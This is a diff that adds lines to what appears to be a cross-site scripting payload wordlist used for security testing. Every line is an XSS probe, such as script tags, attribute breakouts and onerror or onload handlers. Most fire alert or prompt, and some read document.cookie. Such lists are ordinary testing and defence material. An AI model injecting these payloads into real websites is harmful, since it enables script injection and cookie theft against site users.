@@ -1,3 +1,21 @@
+<script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<script>alert(“XSS”)</script> 
+<script>alert(“XSS”);</script>
+<script>alert(‘XSS’)</script>
+“><script>alert(“XSS”)</script>
+<script>alert(/XSS”)</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
+</script><script >alert(document.cookie)</script>
+<img src=asdf onerror=alert(document.cookie)>
+<BODY ONLOAD=alert(’XSS’)>
+<script>alert(1)</script>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
 </script>"><script>prompt(1)</script>
 </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
 "><img src=x onerror=prompt(1)>
